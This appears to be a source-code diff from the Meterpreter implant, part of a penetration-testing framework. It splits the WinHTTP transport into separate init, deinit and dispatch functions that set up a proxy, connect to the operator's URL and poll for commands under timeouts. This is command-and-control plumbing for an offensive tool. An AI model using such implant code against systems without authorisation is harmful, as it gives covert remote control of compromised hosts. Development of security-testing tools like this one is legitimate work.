@@ -7,67 +7,36 @@
 #include "../../common/common.h"
 #include <winhttp.h>
 
-#ifdef USE_WINHTTP
-
 #define HOSTNAME_LEN 512
 #define URLPATH_LEN 1024
 
-DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* serverThread, int iExpirationTimeout, int iCommTimeout,
-	wchar_t* pMetUA, wchar_t* pMetProxy, wchar_t* pMetProxyUser, wchar_t* pMetProxyPass)
+BOOL server_init_http_winhttp(Remote* remote, SOCKET fd)
 {
-	BOOL running = TRUE;
-	LONG result = ERROR_SUCCESS;
-	Packet * packet = NULL;
-	THREAD * cpt = NULL;
 	URL_COMPONENTS bits;
-	DWORD ecount = 0;
-	DWORD delay = 0;
 	wchar_t tmpHostName[512];
 	wchar_t tmpUrlPath[1024];
+	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
 
-	remote->expiration_time = 0;
-	if (iExpirationTimeout > 0)
+	dprintf("[WINHTTP] Initialising ...");
+
+	// configure proxy
+	if (ctx->proxy && wcscmp(ctx->proxy, L"METERPRETER_PROXY") != 0)
 	{
-		remote->expiration_time = current_unix_timestamp() + iExpirationTimeout;
-	}
-
-	remote->comm_timeout = iCommTimeout;
-	remote->start_time = current_unix_timestamp();
-	remote->comm_last_packet = current_unix_timestamp();
-
-	// Allocate the top-level handle
-	if (!wcscmp(pMetProxy, L"METERPRETER_PROXY"))
-	{
-		remote->hInternet = WinHttpOpen(pMetUA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
+		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 	else
 	{
-		remote->hInternet = WinHttpOpen(pMetUA, WINHTTP_ACCESS_TYPE_NAMED_PROXY, pMetProxy, NULL, 0);
+		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 
-	if (!remote->hInternet)
+	if (!ctx->internet)
 	{
 		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
-		return 0;
+		return FALSE;
 	}
 
-	// Proxy auth, if required.
-	if (wcscmp(pMetProxyUser, L"METERPRETER_USERNAME_PROXY") != 0)
-	{
-		if (!WinHttpSetOption(remote->hInternet, WINHTTP_OPTION_PROXY_USERNAME, pMetProxyUser, lstrlen(pMetProxyUser) + 1))
-		{
-			dprintf("[DISPATCH] Failed to set proxy username");
-		}
-	}
-	else if(wcscmp(pMetProxyPass, L"METERPRETER_PASSWORD_PROXY") != 0)
-	{
-		if (!WinHttpSetOption(remote->hInternet, WINHTTP_OPTION_PROXY_PASSWORD, pMetProxyPass, lstrlen(pMetProxyPass) + 1))
-		{
-			dprintf("[DISPATCH] Failed to set proxy username");
-		}
-	}
-
-	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);
+	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);
 
 	// The InternetCrackUrl method was poorly designed...
 	ZeroMemory(tmpHostName, sizeof(tmpHostName));
@@ -82,46 +51,72 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* serverThread, int iEx
 	bits.dwUrlPathLength = URLPATH_LEN - 1;
 	bits.lpszUrlPath = tmpUrlPath;
 
-	WinHttpCrackUrl(remote->url, 0, 0, &bits);
+	dprintf("[DISPATCH] About to crack URL: %S", remote->transport->url);
+	WinHttpCrackUrl(remote->transport->url, 0, 0, &bits);
 
-	remote->uri = _wcsdup(tmpUrlPath);
+	ctx->uri = _wcsdup(tmpUrlPath);
 
-	dprintf("[DISPATCH] Configured URL: %S", remote->uri);
+	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
 	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);
 
 	// Allocate the connection handle
-	remote->hConnection = WinHttpConnect(remote->hInternet, tmpHostName, bits.nPort, 0);
-	if (!remote->hConnection)
+	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
+	if (!ctx->connection)
 	{
 		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
-		return 0;
+		return FALSE;
 	}
 
-	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);
+	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);
 
 	// Bring up the scheduler subsystem.
-	result = scheduler_initialize(remote);
-	if (result != ERROR_SUCCESS)
-	{
-		return result;
-	}
+	return scheduler_initialize(remote) == ERROR_SUCCESS;
+}
+
+DWORD server_deinit_http_winhttp(Remote* remote)
+{
+	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+
+	dprintf("[WINHTTP] Deinitialising ...");
+
+	WinHttpCloseHandle(ctx->connection);
+	WinHttpCloseHandle(ctx->internet);
+
+	dprintf("[DISPATCH] calling scheduler_destroy...");
+	scheduler_destroy();
+
+	dprintf("[DISPATCH] calling command_join_threads...");
+	command_join_threads();
+
+	return TRUE;
+}
+
+DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* dispatchThread)
+{
+	BOOL running = TRUE;
+	LONG result = ERROR_SUCCESS;
+	Packet* packet = NULL;
+	THREAD* cpt = NULL;
+	DWORD ecount = 0;
+	DWORD delay = 0;
+	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
 
 	while (running)
 	{
-		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp())
+		if (ctx->comm_timeout != 0 && ctx->comm_last_packet + ctx->comm_timeout < current_unix_timestamp())
 		{
 			dprintf("[DISPATCH] Shutting down server due to communication timeout");
 			break;
 		}
 
-		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp())
+		if (ctx->expiration_time != 0 && ctx->expiration_time < current_unix_timestamp())
 		{
 			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
-			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
+			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), ctx->expiration_time);
 			break;
 		}
 
-		if (event_poll(serverThread->sigterm, 0))
+		if (event_poll(dispatchThread->sigterm, 0))
 		{
 			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
 			break;
@@ -134,7 +129,7 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* serverThread, int iEx
 			// Update the timestamp for empty replies
 			if (result == ERROR_EMPTY)
 			{
-				remote->comm_last_packet = current_unix_timestamp();
+				ctx->comm_last_packet = current_unix_timestamp();
 			}
 			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
 			{
@@ -159,7 +154,7 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* serverThread, int iEx
 			continue;
 		}
 
-		remote->comm_last_packet = current_unix_timestamp();
+		ctx->comm_last_packet = current_unix_timestamp();
 
 		// Reset the empty count when we receive a packet
 		ecount = 0;
@@ -170,19 +165,5 @@ DWORD server_dispatch_http_winhttp(Remote* remote, THREAD* serverThread, int iEx
 		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
 	}
 
-	// Close WinInet handles
-	WinHttpCloseHandle(remote->hConnection);
-	WinHttpCloseHandle(remote->hInternet);
-
-	dprintf("[DISPATCH] calling scheduler_destroy...");
-	scheduler_destroy();
-
-	dprintf("[DISPATCH] calling command_join_threads...");
-	command_join_threads();
-
-	dprintf("[DISPATCH] leaving server_dispatch.");
-
 	return result;
 }
-
-#endif
